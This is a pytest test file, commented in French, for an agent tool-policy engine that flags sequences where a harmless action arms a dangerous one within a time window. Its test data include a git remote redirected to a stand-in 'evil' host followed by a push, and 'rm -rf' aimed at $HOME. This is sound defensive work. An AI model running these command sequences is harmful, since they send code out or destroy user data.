"""Règles d'armement (issue #666) : une action anodine arme une action dangereuse.

Avant ce lot, aucune composition d'appels n'était jugée : éditer un fichier
Kustomize puis ``kubectl apply``, ``chmod +x`` puis exécuter, ``git remote
set-url`` puis ``git push`` passaient chacun pour ce qu'ils sont isolément —
sûrs. Chaque test ci-dessous est rouge sans le lot (la clé ``arms`` était
refusée au chargement, ``GR-POL-002``) et vert avec.

Décision de Guilhem, respectée ici et vérifiée par
``test_le_kit_ne_livre_aucune_regle_d_armement`` : le kit ne livre **zéro**
règle d'armement ; un projet déclare les siennes dans
``_grimoire/standard/policies.yaml``.
"""

from __future__ import annotations

import time
from datetime import UTC, datetime, timedelta
from pathlib import Path

import pytest

from grimoire.core.agentic_standard import setup_standard_profile
from grimoire.core.exceptions import GrimoirePolicyError
from grimoire.hosts.decisions._shared import HookInput, Outcome
from grimoire.hosts.decisions.tool_policy import _DESTRUCTIVE_AT_STRICT, decide_tool_policy
from grimoire.hosts.events import HookEvent
from grimoire.policies.engine import _BUILTIN_RULES
from grimoire.policies.rules_config import load_custom_rules
from grimoire.policies.schemas import ArmingRule, PolicyRule, VerdictKind
from grimoire.policies.session_state import SessionState, load_session_state
from grimoire.policies.temporal import evaluate_temporal

# ── schémas ──────────────────────────────────────────────────────────────────


def _rule(**overrides: object) -> dict[str, object]:
    base: dict[str, object] = {
        "id": "flux-apply",
        "verdict_on_match": "warn",
        "arms": {"pattern": "Write(*flux/*)", "then": "Bash(kubectl apply:*)", "minutes": 10},
    }
    base.update(overrides)
    return base


def test_arming_rule_round_trips_through_dict() -> None:
    rule = PolicyRule.from_dict(_rule())

    assert rule.arms == ArmingRule(pattern="Write(*flux/*)", then="Bash(kubectl apply:*)", minutes=10.0)
    assert rule.is_temporal and not rule.has_session_counters
    assert PolicyRule.from_dict(rule.to_dict()) == rule


@pytest.mark.parametrize(
    "arms,message",
    [
        ({"pattern": "Write(*)", "then": "Bash(x:*)", "extra": 1}, "clé"),
        ({"pattern": "Write(*)"}, "manquant"),
        ({"pattern": "*", "then": "Bash(x:*)"}, "jamais '\\*'"),
        ({"pattern": "Write(*)", "then": "Bash(x:*)", "minutes": 0}, "positif"),
    ],
)
def test_arming_rule_rejects_malformed_declarations_by_name(arms: dict[str, object], message: str) -> None:
    with pytest.raises(GrimoirePolicyError, match=message):
        PolicyRule.from_dict(_rule(arms=arms))


def test_an_arming_rule_in_allow_is_refused_at_load() -> None:
    """Une règle d'armement qui ne dirait rien n'est pas une règle : erreur nommée."""
    with pytest.raises(GrimoirePolicyError, match="warn ou block"):
        PolicyRule.from_dict(_rule(verdict_on_match="allow"))


def test_le_kit_ne_livre_aucune_regle_d_armement() -> None:
    """Critère 5 : aucune règle par défaut — la première fausse alerte tuerait la confiance."""
    assert all(rule.arms is None for rule in (*_BUILTIN_RULES, _DESTRUCTIVE_AT_STRICT))


# ── décision pure (evaluate_temporal) ────────────────────────────────────────

NOW = datetime(2026, 10, 20, 9, 0, tzinfo=UTC)


def _arms(pattern: str, then: str, *, verdict: str = "warn", minutes: float = 10.0) -> PolicyRule:
    return PolicyRule.from_dict(
        {"id": "arm", "verdict_on_match": verdict, "arms": {"pattern": pattern, "then": then, "minutes": minutes}}
    )


def _run(rule: PolicyRule, state: SessionState, tool: str, detail: str, *, now: datetime = NOW, write: bool = True):
    return evaluate_temporal((rule,), state, tool_name=tool, tool_detail=detail, is_write=write, now=now)


@pytest.mark.parametrize(
    "pattern,arm_call,then,fire_call",
    [
        ("Write(*flux/*)", ("Write", "clusters/flux/kustomization.yaml"), "Bash(kubectl apply:*)", ("Bash", "kubectl apply -k clusters/flux")),
        ("Bash(chmod +x:*)", ("Bash", "chmod +x deploy.sh"), "Bash(./*)", ("Bash", "./deploy.sh")),
        ("Write(*.sh)", ("Write", "scripts/run.sh"), "Bash(bash:*)", ("Bash", "bash scripts/run.sh")),
        ("Bash(git remote set-url:*)", ("Bash", "git remote set-url origin git@evil:x.git"), "Bash(git push:*)", ("Bash", "git push origin main")),
        ("Bash(rm_target=*)", ("Bash", 'rm_target="$HOME"'), "Bash(rm -rf:*)", ("Bash", 'rm -rf "$rm_target"')),
    ],
    ids=["flux-kubectl", "chmod-exec", "write-bash", "remote-push", "var-rm"],
)
def test_the_armed_action_is_elevated_only_after_the_arming_one(
    pattern: str, arm_call: tuple[str, str], then: str, fire_call: tuple[str, str]
) -> None:
    rule = _arms(pattern, then)
    state = SessionState.new("s", NOW.isoformat())

    cold = _run(rule, state, *fire_call)
    assert cold.verdict is VerdictKind.ALLOW, "sans armement, l'action dangereuse passe comme avant"

    armed = _run(rule, state, *arm_call)
    assert armed.verdict is VerdictKind.ALLOW, "l'action qui arme est anodine : elle passe"
    assert "arm" in state.armed

    fired = _run(rule, state, *fire_call, now=NOW + timedelta(minutes=1))
    assert fired.verdict is VerdictKind.WARN
    assert fired.matched_rules[0].rule_id == "arm"
    assert then in fired.reason and pattern in fired.reason


def test_block_verdict_is_honoured() -> None:
    rule = _arms("Bash(chmod +x:*)", "Bash(./*)", verdict="block")
    state = SessionState.new("s", NOW.isoformat())
    _run(rule, state, "Bash", "chmod +x x.sh")

    assert _run(rule, state, "Bash", "./x.sh").verdict is VerdictKind.BLOCK


def test_one_line_that_arms_and_fires_is_judged_armed() -> None:
    """``chmod +x s.sh && ./s.sh`` : le segment qui tire est comparé après l'armement."""
    rule = _arms("Bash(chmod +x:*)", "Bash(./*)")
    state = SessionState.new("s", NOW.isoformat())

    assert _run(rule, state, "Bash", "chmod +x s.sh && ./s.sh").verdict is VerdictKind.WARN


def test_the_arming_expires_after_the_window() -> None:
    """Critère 3 : ~10 min, puis la composition n'est plus jugée."""
    rule = _arms("Write(*flux/*)", "Bash(kubectl apply:*)", minutes=10)
    state = SessionState.new("s", NOW.isoformat())
    _run(rule, state, "Write", "flux/app.yaml")

    inside = _run(rule, state, "Bash", "kubectl apply -f flux/app.yaml", now=NOW + timedelta(minutes=9, seconds=59))
    assert inside.verdict is VerdictKind.WARN
    outside = _run(rule, state, "Bash", "kubectl apply -f flux/app.yaml", now=NOW + timedelta(minutes=10, seconds=1))
    assert outside.verdict is VerdictKind.ALLOW
    assert "arm" not in state.armed, "l'armement échu est retiré de l'état"


def test_an_unreadable_expiry_fails_closed() -> None:
    rule = _arms("Write(*flux/*)", "Bash(kubectl apply:*)")
    state = SessionState.new("s", NOW.isoformat())
    state.armed["arm"] = "pas-une-date"

    assert _run(rule, state, "Bash", "kubectl apply -k .").verdict is VerdictKind.WARN
    assert datetime.fromisoformat(state.armed["arm"]) == NOW + timedelta(minutes=10), "réécrite, plus jamais illisible"


@pytest.mark.parametrize(
    "written",
    ["clusters\\flux\\kustomization.yaml", "C:\\repo\\clusters\\flux\\kustomization.yaml", "clusters/flux/kustomization.yaml"],
)
def test_windows_and_posix_paths_arm_identically(written: str) -> None:
    """Critère 4 : le motif est écrit avec ``/`` ; un chemin Windows l'atteint quand même."""
    rule = _arms("Write(*flux/*)", "Bash(kubectl apply:*)")
    state = SessionState.new("s", NOW.isoformat())
    _run(rule, state, "Write", written)

    assert "arm" in state.armed


def test_jq_and_grep_never_arm_nor_fire() -> None:
    """Jamais de faux positif sur une lecture : ni ``jq`` ni ``grep`` ne touchent une règle d'armement."""
    rule = _arms("Bash(chmod +x:*)", "Bash(bash:*)")
    state = SessionState.new("s", NOW.isoformat())

    for command in ("jq '.a | select(.b)' f.json", "grep -r 'chmod +x' .", "cat deploy.sh | grep bash"):
        assert _run(rule, state, "Bash", command, write=False).verdict is VerdictKind.ALLOW
    assert not state.armed


def test_an_arming_only_rule_never_touches_session_counters() -> None:
    """Pas de compteur, pas d'empreinte, pas de hit : seule la paire armé/échéance est écrite."""
    rule = _arms("Write(*flux/*)", "Bash(kubectl apply:*)")
    state = SessionState.new("s", NOW.isoformat())
    _run(rule, state, "Write", "flux/app.yaml")
    _run(rule, state, "Bash", "kubectl apply -k flux")

    assert state.rules == {}


def test_the_armed_state_survives_a_round_trip_through_disk(tmp_path: Path) -> None:
    from grimoire.policies.session_state import save_session_state

    state = SessionState.new("s", NOW.isoformat())
    state.armed["arm"] = (NOW + timedelta(minutes=10)).isoformat()
    save_session_state(tmp_path, state, now_iso=NOW.isoformat())

    assert load_session_state(tmp_path, "s", now_iso=NOW.isoformat()).armed == state.armed


# ── bout en bout, par policies.yaml et le hook PreToolUse ────────────────────


def _write_policies_yaml(project_root: Path, yaml_text: str) -> None:
    path = project_root / "_grimoire" / "standard" / "policies.yaml"
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(yaml_text, encoding="utf-8")


@pytest.fixture
def governed_project(tmp_path: Path) -> Path:
    setup_standard_profile(tmp_path, profile_id="governed", task_id="bootstrap")
    return tmp_path


_FLUX_RULE = """
rules:
  - id: flux-then-apply
    description: "éditer Flux puis kubectl apply demande confirmation"
    verdict_on_match: warn
    reason_template: "Un manifeste Flux vient d'être édité : confirme l'apply"
    arms: {pattern: "Write(*flux/*)", then: "Bash(kubectl apply:*)", minutes: 10}
"""


def _write(project: Path, path: str, session: str) -> Outcome:
    hook = HookInput(
        event=HookEvent.PRE_TOOL_USE, project_root=project, tool_name="Write",
        tool_input={"file_path": str(project / path), "content": "x"}, session_id=session,
    )
    return decide_tool_policy(hook).outcome


def _bash(project: Path, command: str, session: str):
    return decide_tool_policy(
        HookInput(
            event=HookEvent.PRE_TOOL_USE, project_root=project, tool_name="Bash",
            tool_input={"command": command}, session_id=session,
        )
    )


def test_flux_then_kubectl_apply_is_silent_without_a_declared_rule(governed_project: Path) -> None:
    """Critère 1 : sans déclaration, rien ne change."""
    assert _write(governed_project, "clusters/flux/app.yaml", "s1") is Outcome.ALLOW
    assert _bash(governed_project, "kubectl apply -k clusters/flux", "s1").outcome is Outcome.ALLOW


def test_flux_then_kubectl_apply_asks_with_the_declared_rule(governed_project: Path) -> None:
    """Critère 2 : la même séquence, règle déclarée → ask."""
    _write_policies_yaml(governed_project, _FLUX_RULE)
    assert _bash(governed_project, "kubectl apply -k clusters/flux", "s2").outcome is Outcome.ALLOW, "non armé"
    assert _write(governed_project, "clusters/flux/app.yaml", "s2") is Outcome.ALLOW

    decision = _bash(governed_project, "kubectl apply -k clusters/flux", "s2")

    assert decision.outcome is Outcome.ASK
    assert "manifeste Flux" in decision.reason
    assert "flux-then-apply" in decision.detail["rules"]


def test_another_session_is_not_armed(governed_project: Path) -> None:
    _write_policies_yaml(governed_project, _FLUX_RULE)
    _write(governed_project, "clusters/flux/app.yaml", "s3")

    assert _bash(governed_project, "kubectl apply -k clusters/flux", "s4").outcome is Outcome.ALLOW


def test_load_custom_rules_accepts_the_arms_key(governed_project: Path) -> None:
    _write_policies_yaml(governed_project, _FLUX_RULE)
    (rule,) = load_custom_rules(governed_project)

    assert rule.arms is not None and rule.arms.then == "Bash(kubectl apply:*)"


def test_pre_tool_use_latency_stays_in_the_temporal_layer_s_order_of_magnitude() -> None:
    """Critère 6 : une règle d'armement coûte quelques comparaisons de motifs, pas plus."""
    counting = PolicyRule.from_dict(
        {"id": "budget", "verdict_on_match": "warn", "per_session": {"max_writes": 1000}}
    )
    arming = _arms("Write(*flux/*)", "Bash(kubectl apply:*)")

    def bench(rules: tuple[PolicyRule, ...]) -> float:
        state = SessionState.new("s", NOW.isoformat())
        start = time.perf_counter()
        for _ in range(300):
            evaluate_temporal(rules, state, tool_name="Bash", tool_detail="kubectl apply -k clusters/flux && echo ok", is_write=True, now=NOW)
        return time.perf_counter() - start

    baseline = bench((counting,))
    with_arming = bench((counting, arming))

    assert with_arming < max(baseline * 5, 0.25), f"{with_arming:.3f}s contre {baseline:.3f}s"
